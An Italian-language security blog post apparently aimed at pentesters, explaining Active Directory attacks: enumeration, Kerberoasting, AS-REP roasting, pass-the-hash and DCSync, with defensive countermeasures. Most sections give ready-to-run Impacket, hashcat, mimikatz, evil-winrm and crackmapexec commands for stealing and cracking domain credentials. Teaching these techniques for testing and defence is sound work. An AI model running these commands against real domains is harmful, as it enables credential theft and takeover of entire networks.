---
layout: post
title: "Active Directory: Kerberoasting, AS-REP Roasting e i vettori di attacco fondamentali"
date: 2026-06-01
cat: red
tags: [Active Directory, Kerberoasting, AS-REP Roasting, Windows, pentest, Impacket]
excerpt: "Active Directory è il cuore dell'infrastruttura Windows enterprise e il bersaglio principale di ogni red team. Kerberoasting, AS-REP Roasting, enumerazione e i vettori di attacco base."
---

Active Directory (AD) è presente nel 90% delle reti enterprise Windows. Chi riesce a comprometterlo ha le chiavi del regno: account, credenziali, GPO, e spesso l'intera infrastruttura. Capire come viene attaccato è il prerequisito per difenderlo.

## Come funziona Active Directory in breve

AD è un servizio di directory distribuito basato su LDAP e Kerberos. Gestisce autenticazione e autorizzazione per tutti gli oggetti della rete: utenti, computer, gruppi, GPO. Il componente centrale è il **Domain Controller (DC)**, che ospita il database NTDS.dit contenente tutti gli hash delle password del dominio.

## Enumerazione AD — prima di tutto

Prima di attaccare, si enumera. Con accesso a un account di dominio (anche non privilegiato):

```bash
# Enumerazione base con ldapsearch
ldapsearch -x -H ldap://10.10.10.1 -b "dc=domain,dc=local" -D "user@domain.local" -w password

# Con BloodHound — raccoglie relazioni e shortest path to DA
bloodhound-python -d domain.local -u user -p password -ns 10.10.10.1 -c all

# Con enum4linux-ng
enum4linux-ng -A 10.10.10.1
```

BloodHound è lo strumento più potente: visualizza graficamente i percorsi di privilege escalation basandosi sulle relazioni tra oggetti AD.

## Kerberoasting

Kerberos emette Service Tickets (TGS) per qualsiasi account di dominio che li richieda. I TGS sono cifrati con l'hash NTLM dell'account di servizio. Se un account di servizio ha un SPN (Service Principal Name) registrato e usa una password debole, è possibile:

1. Richiedere il TGS per quel servizio
2. Estrarre il ticket cifrato
3. Crackarlo offline

```bash
# Impacket — lista SPN e ottiene i ticket
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.1 -request

# Output: hash in formato $krb5tgs$23$*...
# Crack con hashcat
hashcat -m 13100 spn_hashes.txt rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
```

> **Difesa**: usa password lunghe (30+ caratteri) per gli account di servizio, oppure Group Managed Service Accounts (gMSA) che ruotano automaticamente.

## AS-REP Roasting

Se un account ha **"Do not require Kerberos preauthentication"** abilitato, è possibile richiedere un AS-REP senza fornire credenziali. Il KDC risponde con dati cifrati con l'hash dell'utente — crackabili offline.

```bash
# Trova account vulnerabili e ottieni AS-REP
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass

# Crack
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

## Pass-the-Hash

Con un hash NTLM ottenuto (da mimikatz, secretsdump, ecc.) è possibile autenticarsi senza conoscere la password in chiaro:

```bash
impacket-psexec domain.local/Administrator@10.10.10.1 -hashes :ntlm_hash
evil-winrm -i 10.10.10.1 -u Administrator -H ntlm_hash
crackmapexec smb 10.10.10.0/24 -u Administrator -H ntlm_hash
```

## DCSync — replicare il Domain Controller

Con privilegi sufficienti (DA, Enterprise Admin, o DCSync rights), è possibile simulare la replica AD e ottenere tutti gli hash:

```bash
impacket-secretsdump domain.local/Administrator@10.10.10.1
# oppure con mimikatz:
# lsadump::dcsync /domain:domain.local /all /csv
```

Il risultato è l'intero database NTDS.dit — game over per il dominio.

## Contromisure chiave

- **Tiered administration model**: nessun DA che usa le proprie credenziali su workstation
- **Protected Users group**: blocca NTLM, Kerberos delegation e caching credenziali
- **Credential Guard**: isola LSA, impedisce l'estrazione di hash
- **Fine-grained password policies**: policy più severe per account privilegiati
- **ATA/Defender for Identity**: rileva Kerberoasting, AS-REP Roasting e DCSync in tempo reale
